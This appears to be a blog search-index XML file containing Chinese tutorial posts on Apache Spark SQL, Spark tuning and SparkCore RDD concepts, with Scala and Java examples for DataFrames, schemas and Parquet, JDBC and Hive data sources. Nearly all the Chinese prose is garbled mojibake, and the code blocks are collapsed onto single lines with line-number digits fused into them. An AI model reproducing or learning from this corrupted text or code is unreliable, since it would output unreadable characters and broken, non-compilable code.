<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Sparké‡ç‚¹è§£æ(ä¸‰) => Spark SQL]]></title>
    <url>%2F2018%2F07%2F27%2FSpark%2FSpark%E9%87%8D%E7%82%B9%E8%A7%A3%E6%9E%90(%E4%B8%89)-%3D-Spark-SQL%2F</url>
    <content type="text"><![CDATA[ä¸€. SparkSQL çš„å‰ä¸–ä»Šç”Ÿ Hive =&gt; MapReduce =&gt; HDFS Shark =&gt; ä½¿ç”¨ Hive çš„ SQL è§£æå¼•æ“ =&gt; RDD =&gt; é€šè¿‡Hive çš„metadataè¡¨å»æ“ä½œ HDFS SparkSQL =&gt; ä½¿ç”¨è‡ªå·±SQL è§£æå¼•æ“ =&gt; RDD =&gt; é€šè¿‡Hive çš„metadataè¡¨å»æ“ä½œ HDFS äºŒ. SparkSessionåœ¨ Spark çš„æ—©æœŸç‰ˆæœ¬(1.x ç‰ˆæœ¬)ä¸­ï¼ŒSparkContext æ˜¯ Spark çš„ä¸»è¦åˆ‡å…¥ç‚¹ï¼Œç”±äº RDD æ˜¯ä¸»è¦çš„ APIï¼Œæˆ‘ ä»¬é€šè¿‡ sparkContext æ¥åˆ›å»ºå’Œæ“ä½œ RDDã€‚å¯¹äºæ¯ä¸ªå…¶ä»–çš„ APIï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ä¸åŒçš„ contextã€‚ ä¾‹å¦‚ï¼š SparkContext =&gt; åˆ›å»º RDD StreamingContext =&gt; åˆ›å»º Streaming SQLContext =&gt; åˆ›å»º SQL HiveContext =&gt; åˆ›å»º Hive ä» Spark 2.0å¼€å§‹, å¼•å…¥ SparkSession â€”- ä¸ºç”¨æˆ·æä¾›ä¸€ä¸ªç»Ÿä¸€çš„åˆ‡å…¥ç‚¹ä½¿ç”¨ Spark å„é¡¹åŠŸèƒ½ â€”- å…è®¸ç”¨æˆ·é€šè¿‡å®ƒè°ƒç”¨ DataFrame å’Œ Dataset ç›¸å…³ API æ¥ç¼–å†™ç¨‹åº â€”- å‡å°‘äº†ç”¨æˆ·éœ€è¦äº†è§£çš„ä¸€äº›æ¦‚å¿µï¼Œå¯ä»¥å¾ˆå®¹æ˜“çš„ä¸ Spark è¿›è¡Œäº¤äº’ â€”- ä¸ Spark äº¤äº’ä¹‹æ—¶ä¸éœ€è¦æ˜¾ç¤ºçš„åˆ›å»º SparkConfã€SparkContext ä»¥åŠ SQlContextï¼Œè¿™äº›å¯¹è±¡å·²ç»å°é—­åœ¨ SparkSession ä¸­ â€”- SparkSession æä¾›å¯¹ Hive ç‰¹å¾çš„å†…éƒ¨æ”¯æŒï¼šç”¨ HiveQL å†™ SQL è¯­å¥ï¼Œè®¿é—® Hive UDFsï¼Œä» Hive è¡¨ä¸­è¯»å–æ•°æ®ã€‚ ä¸‰. DataFrameæ³¨æ„: è¿™é‡Œçš„æ“ä½œéƒ½æ˜¯åŸºäº1.x ç‰ˆæœ¬, ä¸2.x çš„åŒºåˆ«å°±æ˜¯2.x ç»Ÿä¸€äº†æ“ä½œå…¥å£ä¸º SparkSession 2.x çš„æ“ä½œä»£ç è§æˆ‘çš„å¦ä¸€ç¯‡ bolg ä» json æ–‡ä»¶è¯»å–ä¸º dataframe, ä½¿ç”¨spark çš„ api è°ƒç”¨ 123456789101112131415161718192021222324252627import org.apache.spark.SparkConfimport org.apache.spark.SparkContextimport org.apache.spark.sql.SQLContextobject DataFrameOperation &#123; def main(args: Array[String]): Unit = &#123; //create datarame //é¦–å…ˆåˆ›å»ºç¨‹åºå…¥å£ val conf=new SparkConf().setAppName("DataFrameOperation") val sc=new SparkContext(conf); //create sqlcontext val sqlContext=new SQLContext(sc); val df=sqlContext.read.json("hdfs://mycluster/user/ap/sparkdatas/people") df.show(); //print schema df.printSchema() //name age df.select("name").show(); // df.select(df("name"),df("age")+1).show() //where df.filter(df("age") &gt; 21).show() //groupby df.groupBy("age").count().show(); &#125;&#125; å››. RDD è½¬ä¸º DataFrame1.ä½¿ç”¨å¯¹è±¡ RDD åå°„ Reflection çš„æ–¹å¼ Scala æ–¹å¼ 1234567891011121314151617181920212223242526272829303132æ­¥éª¤: 1) æ„é€ ä¸€ä¸ªå°è£…äº†æŒ‡å®šå¯¹è±¡çš„RDD 2) å¼•å…¥sparksessionçš„éšå¼è½¬æ¢ 3) è°ƒç”¨ rdd.toDF()=====================================================================import org.apache.spark.sql.SQLContextimport org.apache.spark.SparkConfimport org.apache.spark.SparkContextcase class Person(age:Int,name:String)object RDD2DataFrameReflection &#123; def main(args: Array[String]): Unit = &#123; //create datarame //é¦–å…ˆåˆ›å»ºç¨‹åºå…¥å£ val conf=new SparkConf().setAppName("RDD2DataFrameReflection") val sc=new SparkContext(conf); //create sqlcontext val sqlContext=new SQLContext(sc); import sqlContext.implicits._ val personRDD= sc.textFile("hdfs://mycluster/user/ap/sparkdatas/peopletxt/people.txt", 2) .map &#123; line =&gt; line.split(",") &#125;.map &#123; p =&gt; Person(p(1).trim().toInt,p(0)) &#125; val personDF=personRDD.toDF() // æˆ–è€… personDF.createOrReplaceTempView("person") / createGlobalTempView / createTempView personDF.registerTempTable("person") val personDataframe=sqlContext.sql("select name,age from person where age &gt; 13 and age &lt;= 19") personDataframe.rdd.foreach &#123; row =&gt; println(row.getString(0)+" "+row.getString(1)) &#125; personDataframe.rdd.saveAsTextFile("hdfs://hadoop1:9000/reflectionresult/") &#125;&#125; Java æ–¹å¼ 12345678910111213141516171819202122232425262728293031323334353637383940414243import org.apache.spark.SparkConf;import org.apache.spark.api.java.JavaRDD;import org.apache.spark.api.java.JavaSparkContext;import org.apache.spark.api.java.function.Function;import org.apache.spark.api.java.function.VoidFunction;import org.apache.spark.sql.DataFrame;import org.apache.spark.sql.Row;import org.apache.spark.sql.SQLContext;public class RDD2DataFrameReflection &#123; public static void main(String[] args) &#123; SparkConf conf = new SparkConf(); conf.setAppName("RDD2DataFrameReflection"); JavaSparkContext sc = new JavaSparkContext(conf); SQLContext sqlContext = new SQLContext(sc); JavaRDD&lt;Person&gt; PersonRDD = sc.textFile("hdfs://hadoop1:9000/examples/src/main/resources/people.txt") .map(new Function&lt;String, Person&gt;() &#123; public Person call(String line) throws Exception &#123; String[] strs = line.split(","); String name=strs[0]; int age=Integer.parseInt(strs[1].trim()); Person person=new Person(age,name); return person; &#125; &#125;); DataFrame personDF = sqlContext.createDataFrame(PersonRDD, Person.class); personDF.registerTempTable("person"); DataFrame resultperson = sqlContext.sql("select name,age from person where age &gt; 13 and age &lt;= 19"); resultperson.javaRDD().foreach(new VoidFunction&lt;Row&gt;() &#123; private static final long serialVersionUID = 1L; public void call(Row row) throws Exception &#123; //æŠŠæ¯ä¸€æ¡æ•°æ®éƒ½çœ‹æˆæ˜¯ä¸€ä¸ªrow row(0)=name row(1)=age System.out.println("name"+row.getString(0)); System.out.println("age"+row.getInt(1)); &#125; &#125;); resultperson.javaRDD().saveAsTextFile("hdfs://hadoop1:9000/reflectionresult"); &#125;&#125; 2. ä½¿ç”¨æ„é€ StructTypeæ–¹å¼ scala 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061è¦ç‚¹: 1) æ„é€  StructType 2) æ„é€  rowRDD val rowRDD = studentRDD.map(p =&gt; Row(p(0).toInt, p(1).trim, p(2).trim, p(3).toInt, p(4).trim)) 3) æ„é€  DataFrame df = sparksession.createDataFrame(rowRDD, schema) import org.apache.spark.sql.SQLContextimport org.apache.spark.SparkConfimport org.apache.spark.SparkContextimport org.apache.spark.sql.types.StructTypeimport org.apache.spark.sql.types.StructFieldimport org.apache.spark.sql.types.StringTypeimport org.apache.spark.sql.Rowobject RDD2DataFrameProgrammatically &#123; def main(args: Array[String]): Unit = &#123; val conf=new SparkConf().setAppName("RDD2DataFrameProgrammatically") val sc=new SparkContext(conf); //create sqlcontext val sqlContext=new SQLContext(sc); import sqlContext.implicits._ val personRDD= sc.textFile("hdfs://hadoop1:9000/examples/src/main/resources/people.txt", 1) //////////////////////////////////////////////////////////////////////// //create schema val schemaString="name age"; val schema=StructType( schemaString.split("\t").map &#123; fieldsName =&gt; StructField(fieldsName,StringType,true) &#125; ) /** å‚æ•° case class StructField( name: String, dataType: DataType, nullable: Boolean = true, metadata: Metadata = Metadata.empty) æ„é€ æ–¹å¼: val schema = StructType( List( StructField("id", IntegerType, true), StructField("name", StringType, true), StructField("sex", StringType, true), StructField("age", IntegerType, true), StructField("department", StringType, true) ) ) */ //create rowrdd val rowRDD=personRDD.map &#123; line =&gt; line.split(",") &#125;.map &#123; p =&gt; Row(p(0),p(1)) &#125; val personDF=sqlContext.createDataFrame(rowRDD, schema) //////////////////////////////////////////////////////////////////////// personDF.registerTempTable("person"); val personDataframe=sqlContext.sql("select name,age from person where age &gt; 13 and age &lt;= 19") personDataframe.rdd.foreach &#123; row =&gt; println(row.getString(0)+"=&gt; "+row.getString(1)) &#125; personDataframe.rdd.saveAsTextFile("hdfs://hadoop1:9000/RDD2DataFrameProgrammatically/") &#125;&#125; Java 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061import java.util.ArrayList;import org.apache.spark.SparkConf;import org.apache.spark.api.java.JavaRDD;import org.apache.spark.api.java.JavaSparkContext;import org.apache.spark.api.java.function.Function;import org.apache.spark.api.java.function.VoidFunction;import org.apache.spark.sql.DataFrame;import org.apache.spark.sql.Row;import org.apache.spark.sql.RowFactory;import org.apache.spark.sql.SQLContext;import org.apache.spark.sql.types.DataTypes;import org.apache.spark.sql.types.StructField;import org.apache.spark.sql.types.StructType;public class RDD2DataFrameProgrammactically &#123; public static void main(String[] args) &#123; SparkConf conf = new SparkConf(); conf.setAppName("RDD2DataFrameProgrammactically"); JavaSparkContext sc = new JavaSparkContext(conf); SQLContext sqlContext = new SQLContext(sc); JavaRDD&lt;String&gt; personRDD = sc.textFile("hdfs://hadoop1:9000/examples/src/main/resources/people.txt"); /** * è¿™é‡Œçš„schemaString æ˜¯ä»æ•°æ®åº“é‡Œé¢åŠ¨æ€è·å–ä»æ¥çš„ * åœ¨å®é™…çš„å¼€å‘ä¸­æˆ‘ä»¬éœ€è¦å†™å¦å¤–çš„ä»£ç å»è·å– */ String schemaString="name age"; //create schema ArrayList&lt;StructField&gt; list = new ArrayList&lt;StructField&gt;(); for(String str:schemaString.split("\t"))&#123; list.add(DataTypes.createStructField(str, DataTypes.StringType, true)); &#125; StructType schema = DataTypes.createStructType(list); /** * éœ€è¦å°†RDDè½¬æ¢ä¸ºä¸€ä¸ªJavaRDDã€ŠRowã€‹ */ JavaRDD&lt;Row&gt; rowRDD = personRDD.map(new Function&lt;String, Row&gt;() &#123; public Row call(String line) throws Exception &#123; String[] fields = line.split(","); return RowFactory.create(fields[0],fields[1]); &#125; &#125;); DataFrame personDF = sqlContext.createDataFrame(rowRDD, schema); personDF.registerTempTable("person"); DataFrame resultperson = sqlContext.sql("select name,age from person where age &gt; 13 and age &lt;= 19"); resultperson.javaRDD().foreach(new VoidFunction&lt;Row&gt;() &#123; private static final long serialVersionUID = 1L; public void call(Row row) throws Exception &#123; //æŠŠæ¯ä¸€æ¡æ•°æ®éƒ½çœ‹æˆæ˜¯ä¸€ä¸ªrow row(0)=name row(1)=age System.out.println("name"+row.getString(0)); System.out.println("age"+row.getInt(1)); &#125; &#125;); resultperson.javaRDD().saveAsTextFile("hdfs://hadoop1:9000/reflectionresult"); &#125;&#125; 3.DataSet &amp; DataFrame &amp; RDDRDD ä»…è¡¨ç¤ºæ•°æ®é›†ï¼ŒRDD æ²¡æœ‰å…ƒæ•°æ®ï¼Œä¹Ÿå°±æ˜¯è¯´æ²¡æœ‰å­—æ®µè¯­ä¹‰å®šä¹‰ DataFrame = RDD+Schema = SchemaRDD Schema æ˜¯å°±æ˜¯å…ƒæ•°æ®ï¼Œæ˜¯è¯­ä¹‰æè¿°ä¿¡æ¯ã€‚ DataFrame æ˜¯ä¸€ç§ç‰¹æ®Šç±»å‹çš„ Datasetï¼ŒDataSet[Row] = DataFrame DataFrame çš„æ•°æ®ç±»å‹ç»Ÿä¸€æ˜¯ Row, ç¼ºç‚¹: Row ä¸èƒ½ç›´æ¥æ“ä½œ domain å¯¹è±¡ å‡½æ•°é£æ ¼ç¼–ç¨‹ï¼Œæ²¡æœ‰é¢å‘å¯¹è±¡é£æ ¼çš„ API æ‰€ä»¥ï¼ŒSpark SQL å¼•å…¥äº† Datasetï¼Œæ‰©å±•äº† DataFrame APIï¼Œæä¾›äº†ç¼–è¯‘æ—¶ç±»å‹æ£€æŸ¥ï¼Œé¢å‘å¯¹è±¡é£æ ¼çš„ APIã€‚ Dataset å¯ä»¥å’Œ DataFrameã€RDD ç›¸äº’è½¬æ¢ã€‚DataFrame=Dataset[Row] å¯è§ DataFrame æ˜¯ä¸€ç§ç‰¹æ®Šçš„ Datasetã€‚ æ—¢ç„¶ Spark SQL æä¾›äº† SQL è®¿é—®æ–¹å¼ï¼Œé‚£ä¸ºä»€ä¹ˆè¿˜éœ€è¦ DataFrame å’Œ Dataset çš„ API å‘¢ï¼Ÿ SQL çš„è¡¨è¾¾èƒ½åŠ›å´æ˜¯æœ‰é™çš„ DataFrame å’Œ Dataset å¯ä»¥é‡‡ç”¨æ›´åŠ é€šç”¨çš„è¯­è¨€ï¼ˆScala æˆ– Pythonï¼‰æ¥è¡¨è¾¾ç”¨æˆ·çš„ æŸ¥è¯¢è¯·æ±‚ã€‚ DataFrame / Dataset çš„é¢å‘å¯¹è±¡è¯­æ³•, å¯ä»¥æ›´å¿«æ•æ‰é”™è¯¯ï¼Œå› ä¸º SQL æ˜¯è¿è¡Œæ—¶æ•è·å¼‚å¸¸ï¼Œè€Œ Dataset æ˜¯ ç¼–è¯‘æ—¶æ£€æŸ¥é”™è¯¯ã€‚ DataFrame &amp; Dataset çš„éƒ¨åˆ† api æ€»çš„æ¥è®²123DataFream=DataSet[row] //å¼±ç±»å‹DataFream=Untyped DatasetDataSet=Untyped Dataset +typed Dataset ä¸¾ä¸ªğŸŒ° SparkCore: RDD 123456789scala&gt; case class Person(name: String, age: Long)defined class Personscala&gt; val rdd = sc.textFile("/user/ap/sparkdatas/peopletxt/people.txt").map(line =&gt; line.split(",")).map(x =&gt; Person(x(0),x(1).trim.toLong))rdd: org.apache.spark.rdd.RDD[Person] = MapPartitionsRDD[14] at map at &lt;console&gt;:26// è¿™é‡Œå¾—åˆ°çš„æ˜¯ RDD[Person] ç±»å‹scala&gt; rdd.collectres11: Array[Person] = Array(Person(Michael,29), Person(Andy,30), Person(Justin,19)) SparkSQL: DataFrame 1234scala&gt; val df = spark.read.json("/user/ap/sparkdatas/people")df: org.apache.spark.sql.DataFrame = [age: bigint, name: string]// Row =&gt;ç›¸å½“äº æ•°æ®åº“çš„è¡¨é‡Œé¢çš„ä¸€è¡Œæ•°æ® DataFrame=DataSet[Row] SparkSQL: DataSet 123// as[Person] æŠŠ Json è¯»å‡ºæ¥çš„æ•°æ®ç›´æ¥åå°„åˆ° Personç±»ä¸Š !! è¿˜æœ‰è¿™ç§éªšæ“ä½œ??scala&gt; val personDS = spark.read.json("/user/ap/sparkdatas/people").as[Person]personDS: org.apache.spark.sql.Dataset[Person] = [age: bigint, name: string] æ¥å¼ å›¾! äº”. æ•°æ®æºä¹‹load å’Œ Save123456789101112131415161718192021222324252627282930313233import org.apache.spark.SparkConfimport org.apache.spark.SparkContextimport org.apache.spark.sql.SQLContextimport org.apache.hadoop.hdfs.server.namenode.SafeModeimport org.apache.spark.sql.SaveModeobject DatasourceLoadAndSave &#123; def main(args: Array[String]): Unit = &#123; val conf=new SparkConf().setAppName("RDD2DataFrameReflection") val sc=new SparkContext(conf); val sqlContext=new SQLContext(sc); // sqlContext.read.json("person.json"); //sparksqlé»˜è®¤æ”¯æŒçš„æ˜¯parquetæ–‡ä»¶æ ¼å¼ val df= sqlContext.read.load("examples/src/main/resources/users.parquet"); // sqlContext.read.format("json").load("person.json") // sqlContext.read.format("parquet").load("users.parquet") //dfä¿å­˜çš„æ—¶å€™ï¼Œå¦‚æœä¸æŒ‡å®šä¿å­˜çš„æ–‡ä»¶æ ¼å¼ï¼Œé»˜è®¤å°±æ˜¯parquet df.select("name", "age").write.save("namesAndAges.parquet"); // df.select("name", "age").write.json("user.json") // df.select("name", "age").write.format("json").save("user.json") df.select("name", "age").write.format("parquet").save("user.parquet") df.select("name", "age").write.mode(SaveMode.ErrorIfExists).format("json").save("hdfs://hadoop1:9000/user.json"); /** * ä¿å­˜ç»“æœæ–‡ä»¶çš„æ—¶å€™çš„ç­–ç•¥ * if data/table already exists, Append, // contents of the DataFrame are expected to be appended to existing data Overwrite, // existing data is expected to be overwritten ErrorIfExists, // an exception is expected to be thrown */ &#125;&#125; å…­. æ•°æ®æºä¹‹parquet files åˆå¹¶123456789101112val df1 = sc.makeRDD(1 to 5).map(i =&gt; (i, i * 2)).toDF("single", "double")df1.write.parquet("/user/ap/test_table/key=1")val df2 = sc.makeRDD(6 to 10).map(i =&gt; (i, i * 3)).toDF("single", "triple")df2.write.parquet("/user/ap/test_table/key=2")//åˆå¹¶ä¸¤ä¸ªdataframe, æˆ‘ä»¬æœŸæœ›çš„å°±æ˜¯åˆå¹¶å‡ºæ¥åº”è¯¥æ˜¯ä¸‰ä¸ªå±æ€§åˆ†åˆ«æ˜¯single double triple//å®é™…ä¸Šæœ€åè¿˜ä¼šæœ‰ä¸€ä¸ªåˆ†åŒºå°±æ˜¯keysval df3 = sqlContext.read.option("mergeSchema", "true").parquet("/user/ap/test_table")df3.printSchema()df3.show() ä¸ƒ. æ•°æ®æºä¹‹ MySQLåœ¨ idea ä¸­è®¿é—® mysql çš„, çœ‹è¿™é‡Œ æ³¨æ„: å¯åŠ¨ Spark Shellï¼Œå¿…é¡»æŒ‡å®š mysql è¿æ¥é©±åŠ¨ jar åŒ… å¯åŠ¨æœ¬æœºçš„å•è¿›ç¨‹ Shell 123spark-shell \--jars $SPARK_HOME/jars/mysql-connector-java-5.1.40-bin.jar \--driver-class-path $SPARK_HOME/jars/mysql-connector-java-5.1.40-bin.jar è¿æ¥ Spark é›†ç¾¤çš„ shell 123456789101112131415161718192021222324spark-shell \--driver-class-path $SPARK_HOME/jars/mysql-connector-java-5.1.40-bin.jar \--master yarn// æŸ¥è¯¢scala&gt; val jdbcDF = spark.read.format("jdbc").option("url", "jdbc:mysql://cs2:3306/test").option("dbtable", "student").option("user", "root").option("password", "123").option("driver","com.mysql.jdbc.Driver").load();jdbcDF: org.apache.spark.sql.DataFrame = [id: int, name: string ... 2 more fields]scala&gt; jdbcDF.show+---+------------+--------+-----+| id| name| course|score|+---+------------+--------+-----+| 1| huangbo| math| 81|| 2| huangbo| englist| 87|| 3| huangbo|computer| 67|| 4| xuzheng| math| 89|| 5| xuzheng| english| 92|| 6| xuzheng|computer| 83|| 7|wangbaoqiang| math| 78|| 8|wangbaoqiang| english| 88|| 9|wangbaoqiang|computer| 90|| 10| dengchao| math| 88|+---+------------+--------+-----+ é€šè¿‡ Spark-submit çš„æ–¹å¼ ç¼–å†™ä»£ç  1234567891011121314151617181920212223242526272829303132//é€šè¿‡è¯»å–æ–‡ä»¶åˆ›å»º RDDval studentRDD = sc.textFile(args(0)).map(_.split(","))//é€šè¿‡ StructType ç›´æ¥æŒ‡å®šæ¯ä¸ªå­—æ®µçš„ schemaval schema = StructType( List( StructField("id", IntegerType, true), StructField("name", StringType, true), StructField("sex", StringType, true), StructField("age", IntegerType, true), StructField("department", StringType, true) ))//å°† RDD æ˜ å°„åˆ° rowRDDval rowRDD = studentRDD.map(p =&gt; Row(p(0).toInt, p(1).trim, p(2).trim, p(3).toInt, p(4).trim))//å°† schema ä¿¡æ¯åº”ç”¨åˆ° rowRDD ä¸Šval studentDataFrame = sqlContext.createDataFrame(rowRDD, schema)//åˆ›å»º Properties å­˜å‚¨æ•°æ®åº“ç›¸å…³å±æ€§val prop = new Properties()prop.put("user", "root")prop.put("password", "root")//å°†æ•°æ®è¿½åŠ åˆ°æ•°æ®åº“studentDataFrame.write.mode("append").jdbc("jdbc:mysql://hadoop02:3306/spider", "student", prop)//åœæ­¢ SparkContextsc.stop() å‡†å¤‡æ•°æ®ï¼šstudent.txt å­˜å‚¨åœ¨ HDFS ä¸Šçš„/student ç›®å½•ä¸­ ç»™é¡¹ç›®æ‰“æˆ jar åŒ…ï¼Œä¸Šä¼ åˆ°å®¢æˆ·ç«¯ æäº¤ä»»åŠ¡ç»™ Spark é›†ç¾¤ï¼š 123456$SPARK_HOME/bin/spark-submit \--class com.mazh.spark.sql.SparkSQL_JDBC \--master yarn \--driver-class-path $SPARK_HOME/jars/mysql-connector-java-5.1.40-bin.jar \/home/hadoop/Spark_WordCount-1.0-SNAPSHOT.jar \hdfs://mycluster/user/ap/sparkdatas/student.txt å…«. æ•°æ®æºä¹‹json12345// æ–¹å¼ 1val df1 = sparkSession.read.json("file://..")// æ–¹å¼ 2val df2 = sparkSession.read.format("json").load("hdfs://mycluster/...") ä¹. æ•°æ®æºä¹‹ Hiveä¸ä¹‹å‰çš„è‡ªå·±æ„é€ æ•°æ®, æˆ–è€…è¯»jsonæ•°æ®ç­‰,å¾—åˆ° DataFrame , ç„¶åæŠŠæ­¤ df.createTempView(â€œtmpViewâ€) ç„¶åå†å¯¹æ­¤ tmpView ä½¿ç”¨ sql è¯­å¥æŸ¥è¯¢ä¸ä¸€æ · ç›´æ¥ç”¨ sparkSession.sql(â€œ...â€) æ“ä½œçš„å¯¹è±¡é»˜è®¤å°±æ˜¯ hive ==&gt; è®¿é—® hive çš„å…ƒæ•°æ®åº“(mysql), æŠŠ hive åº•å±‚çš„æ‰§è¡Œå¼•æ“ MapReduce æ¢æˆäº†SparkCore å. æ•°æ®æºä¹‹ HBase]]></content>
      <categories>
        <category>Spark</category>
        <category>ç²¾è®²</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Spark</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Sparké‡ç‚¹è§£æ(ä¸€) => Sparkè°ƒä¼˜]]></title>
    <url>%2F2018%2F07%2F27%2FSpark%2FSpark%E9%87%8D%E7%82%B9%E8%A7%A3%E6%9E%90(%E4%BA%8C)%20%3D%3E%20Spark%E8%B0%83%E4%BC%98%2F</url>
    <content type="text"><![CDATA[å‰è¨€Sparkæ•´å¥—è°ƒä¼˜æ–¹æ¡ˆä¸»è¦åˆ†ä¸ºå¼€å‘è°ƒä¼˜ã€èµ„æºè°ƒä¼˜ã€æ•°æ®å€¾æ–œè°ƒä¼˜ã€shuffleè°ƒä¼˜å‡ ä¸ªéƒ¨åˆ†ã€‚ å¼€å‘è°ƒä¼˜å’Œèµ„æºè°ƒä¼˜æ˜¯æ‰€æœ‰Sparkä½œä¸šéƒ½éœ€è¦æ³¨æ„å’Œéµå¾ªçš„ä¸€äº›åŸºæœ¬åŸåˆ™ï¼Œæ˜¯é«˜æ€§èƒ½Sparkä½œä¸šçš„åŸºç¡€ï¼› æ•°æ®å€¾æ–œè°ƒä¼˜ï¼Œä¸»è¦è®²è§£äº†ä¸€å¥—å®Œæ•´çš„ç”¨æ¥è§£å†³Sparkä½œä¸šæ•°æ®å€¾æ–œçš„è§£å†³æ–¹æ¡ˆï¼› shuffleè°ƒä¼˜ï¼Œä¸»è¦è®²è§£äº†å¦‚ä½•å¯¹Sparkä½œä¸šçš„shuffleè¿è¡Œè¿‡ç¨‹ä»¥åŠç»†èŠ‚è¿›è¡Œè°ƒä¼˜ã€‚ æœ¬æ–‡ä¸»è¦å‚è€ƒç¾å›¢ç‚¹è¯„æŠ€æœ¯åšå®¢ä¹‹ Sparkæ€§èƒ½ä¼˜åŒ–æŒ‡å—â€”â€”åŸºç¡€ç¯‡ Sparkæ€§èƒ½ä¼˜åŒ–æŒ‡å—â€”â€”é«˜çº§ç¯‡ ä¸€. å¼€å‘è°ƒä¼˜]]></content>
      <categories>
        <category>Spark</category>
        <category>ç²¾è®²</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Spark</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Sparké‡ç‚¹è§£æ(ä¸€) => SparkCore]]></title>
    <url>%2F2018%2F07%2F25%2FSpark%2FSpark%E9%87%8D%E7%82%B9%E8%A7%A3%E6%9E%90(%E4%B8%80)%20%3D%3E%20SparkCore%2F</url>
    <content type="text"><![CDATA[ä¸€. Spark ä¸ MapReduce åŒºåˆ«Apache Sparkâ„¢ is a fast and general engine for large-scale data processing. ä¸mapreduceæ¯”è¾ƒ ï¼š Sparkå¤§å¤šæ•°æ‰§è¡Œè¿‡ç¨‹æ˜¯åŸºäºå†…å­˜çš„è¿­ä»£ MapReduce çš„ ä¼˜ç‚¹, SparkCore éƒ½æœ‰ Hive èƒ½åšçš„æ“ä½œ, SparkSQL éƒ½èƒ½åš, å¯ä»¥å†™ SQL è¯­å¥è½¬æ¢ä¸º SparkCore ä»£ç  Spark Streaming æä¾›è¿‘å®æ—¶æµ è¶…è¿‡80ä¸ªç±»ä¼¼äº map, reduce è¿™æ ·çš„æ“ä½œ å¯ä»¥åœ¨Tachyonï¼ˆåŸºäºå†…å­˜çš„åˆ†å¸ƒå¼çš„æ–‡ä»¶ç³»ç»Ÿ (HDFS æ˜¯åŸºäºç£ç›˜)) ä¸Šè¿è¡ŒSpark, ä¼šæ›´å¿« äºŒ. ä»€ä¹ˆæ˜¯RDD1ã€RDDæ˜¯Sparkæä¾›çš„æ ¸å¿ƒæŠ½è±¡ï¼Œå…¨ç§°ä¸ºResillient Distributed Datasetï¼Œå³å¼¹æ€§åˆ†å¸ƒå¼æ•°æ®é›†ã€‚ 2ã€RDDåœ¨æŠ½è±¡ä¸Šæ¥è¯´æ˜¯ä¸€ç§å…ƒç´ é›†åˆï¼ŒåŒ…å«äº†æ•°æ®ã€‚å®ƒæ˜¯è¢«åˆ†åŒºçš„ï¼Œåˆ†ä¸ºå¤šä¸ªåˆ†åŒºï¼Œæ¯ä¸ªåˆ†åŒºåˆ†å¸ƒåœ¨é›†ç¾¤ä¸­çš„ä¸åŒèŠ‚ç‚¹ä¸Šï¼Œä»è€Œè®©RDDä¸­çš„æ•°æ®å¯ä»¥è¢«å¹¶è¡Œæ“ä½œã€‚ï¼ˆåˆ†å¸ƒå¼æ•°æ®é›†ï¼‰ å¦‚æœè¯»å–çš„æ–‡ä»¶æœ¬æ¥å°±å­˜åœ¨äº3ä¸ªåˆ†åŒº, è¿™äº›æ“ä½œä¼šå¹¶è¡Œæ“ä½œ, å¦‚ä½•å¹¶è¡Œæ“ä½œ? :TODO å¦‚æœå­˜åœ¨äº3ä¸ªåˆ†åŒº, æ‰‹åŠ¨è§„å®šäº†2ä¸ªåˆ†åŒº, é‚£ä¹ˆæ˜¯å¦‚ä½•å·¥ä½œçš„ ? :TODO 3ã€RDDé€šå¸¸é€šè¿‡Hadoopä¸Šçš„æ–‡ä»¶ï¼Œå³HDFSæ–‡ä»¶æˆ–è€…Hiveè¡¨ï¼Œæ¥è¿›è¡Œåˆ›å»ºï¼›æœ‰æ—¶ä¹Ÿå¯ä»¥é€šè¿‡åº”ç”¨ç¨‹åºä¸­çš„é›†åˆæ¥åˆ›å»ºã€‚ ä»æ–‡ä»¶ç³»ç»Ÿè¯»å–: local æˆ– HDFS sc.textFile(&quot;/Users/shixuanji/Documents/a.txt&quot;,2); Hive è¡¨: : TODO å¹¶è¡ŒåŒ–çš„æ–¹å¼åˆ›å»º(å¤šç”¨äºæµ‹è¯•): val rdd = sc.makeRDD(1 to 10) æˆ–è€… val rdd = sc.parallelize(arr); 4ã€RDDæœ€é‡è¦çš„ç‰¹æ€§å°±æ˜¯ï¼Œæä¾›äº†å®¹é”™æ€§ï¼Œå¯ä»¥è‡ªåŠ¨ä»èŠ‚ç‚¹å¤±è´¥ä¸­æ¢å¤è¿‡æ¥ã€‚å³å¦‚æœæŸä¸ªèŠ‚ç‚¹ä¸Šçš„RDD partitionï¼Œå› ä¸ºèŠ‚ç‚¹æ•…éšœï¼Œå¯¼è‡´æ•°æ®ä¸¢äº†ï¼Œé‚£ä¹ˆRDDä¼šè‡ªåŠ¨é€šè¿‡è‡ªå·±çš„æ•°æ®æ¥æºé‡æ–°è®¡ç®—è¯¥partitionã€‚è¿™ä¸€åˆ‡å¯¹ä½¿ç”¨è€…æ˜¯é€æ˜çš„ã€‚ 5ã€RDDçš„æ•°æ®é»˜è®¤æƒ…å†µä¸‹å­˜æ”¾åœ¨å†…å­˜ä¸­çš„ï¼Œä½†æ˜¯åœ¨å†…å­˜èµ„æºä¸è¶³æ—¶ï¼ŒSparkä¼šè‡ªåŠ¨å°†RDDæ•°æ®å†™å…¥ç£ç›˜ã€‚ï¼ˆå¼¹æ€§ == çµæ´»ï¼‰ ä¸‹å›¾ä¸­ç”»æ©™è‰²æ¡†çš„éƒ½æ˜¯ RDD æºç ä¸­çš„æ³¨é‡Šè¯´æ˜1ã€A list of partitionsï¼šä¸€ç»„åˆ†ç‰‡ï¼ˆPartitionï¼‰ï¼Œå³æ•°æ®é›†çš„åŸºæœ¬ç»„æˆå•ä½ 2ã€A function for computing each splitï¼šä¸€ä¸ªè®¡ç®—æ¯ä¸ªåˆ†åŒºçš„å‡½æ•° 3ã€A list of dependencies on other RDDsï¼šRDD ä¹‹é—´çš„ä¾èµ–å…³ç³» NarrowDependency å®Œå…¨ä¾èµ–, çª„ä¾èµ– ShuffleDependency éƒ¨åˆ†ä¾èµ–, â€˜â€™å®½ä¾èµ–â€™â€™ 4ã€Optionally, a Partitioner for key-value RDDs (e.g. to say that the RDD is 